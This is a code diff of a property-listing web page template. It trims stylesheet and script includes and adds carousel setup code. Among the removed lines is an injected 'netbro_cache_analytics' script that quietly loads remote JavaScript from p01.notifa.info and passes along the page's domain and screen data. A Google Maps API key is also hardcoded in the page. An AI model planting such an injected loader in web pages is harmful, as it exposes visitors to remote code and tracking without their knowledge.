@@ -12,19 +12,7 @@
      
     <!-- External Css -->
     <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
-    <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
     <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />
-
-    <!-- leaflet -->
-    <link rel="stylesheet" href="{{asset('assets/leaflet/css/leaflet.css')}}">
-    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.css')}}">
-    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.Default.css')}}">
 
     <!-- Custom Css -->
     <link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">
@@ -617,30 +605,84 @@
     <script src="{{asset('assets/js/jquery.min.js')}}"></script>
     <!-- Include all compiled plugins (below), or include individual files as needed -->
     <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
-    <script src="{{asset('assets/js/visible.js')}}"></script>
     <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
-    <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
-    <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
-    <script src="{{asset('assets/js/plyr.js')}}"></script>
-    <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
-    <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
-    <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
-    <script src="{{asset('assets/js/tinymce.min.js')}}"></script>
-    <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
-    <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
-    <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>
-
-    <!-- leaflet -->
-    <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
-    <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
-    <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>
-
-    <script src="{{asset('js/custom.js')}}"></script>
-    <script src="{{asset('js/dashboard.js')}}"></script>
+    
     <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
     <script src="{{asset('js/map.js')}}"></script>
     <script src="{{asset('js/searchMap.js')}}"></script>
-  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pKDg3PqvkzNXAOm4wikTrlCrC%2feMOxffLd3n5o2xx6wIa3Kj8We0h1sbSMJGLXFWVrC2jxf7d5foR3pSwSo8%2fGGWKgMFs%2fe1t%2frseAKYxMhn5XzBpwBry4AXbr5Gyy2tJJiPGfMRknyB3VKdNWWyrSgU7bwPWdFmJqiyrIM7k8Tdj4hToLgOSy9zd%2fML8Dgz%2bL0rNd4XynGI6GtSzzB8Wgzux0rJShyVp3UYPgWTwwa1zFkGb7Te4NcRly8MCzON62QMNGqrKJ1%2fpZAw9DhXhoB8lKZBidUBW3LNBCYu4cUFOsPXFL0tfs6zy4U3KK9EU9I0HgQKo%2bJDzyhNgfNPcok83SLI8CLJLdz5WUolVf2BW4H%2bgO2hXsTsedWB0onR0uK4SOiSRkyxYUsdlA4aKFz0Unhd%2fQNXB%2b2ODn26%2f0VNBgpLUorhBvO8RRRfQgkDm4p1clVdYvyOP%2bRu24bT%2fA7nMBVxWZmi1262HXIVXBc6jEih0MF%2bwXch0fJw09R1ck%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+        <script>
+      if ($('.cp-slider').length > 0) {
+        $('.cp-slider').each(function () {
+            $(this).owlCarousel({
+                singleItem: true,
+                slideSpeed: 200,
+                autoPlay: 3000,
+                stopOnHover: true,
+                mouseDrag : false,
+                touchDrag : false,
+                navigation: true,
+                navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+                pagination: false
+            });
+        });
+    };
+
+    if ($('.listing-slider').length > 0) {
+        $('.listing-slider').each(function () {
+            $(this).owlCarousel({
+                singleItem: true,
+                slideSpeed: 200,
+                autoPlay: 3000,
+                stopOnHover: true,
+                navigation: true,
+                navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+                pagination: false
+            });
+        });
+    };
+
+    if ($('.post-slider').length > 0) {
+        $('.post-slider').each(function () {
+            $(this).owlCarousel({
+                singleItem: true,
+                slideSpeed: 200,
+                autoPlay: 3000,
+                stopOnHover: true,
+                navigation: true,
+                navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+                pagination: false
+            });
+        });
+    };
+
+    if ($('#property-slider').length > 0) {
+        $('#property-slider').owlCarousel({
+            singleItem: true,
+            slideSpeed: 200,
+            autoPlay: 3000,
+            stopOnHover: true,
+            navigation: true,
+            navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+            pagination: false
+        });
+    };
+
+
+    $('.testimonial').each(function () {
+        $(this).owlCarousel({
+            singleItem: true,
+            slideSpeed: 200,
+            autoPlay: 3000,
+            stopOnHover: true,
+            navigation: true,
+            navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+            pagination: false
+        });
+    });
+
+
+    </script>
 
 <!-- Mirrored from eorrangeshop.com/html/divinevillas/property-details.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:46 GMT -->
 </html>
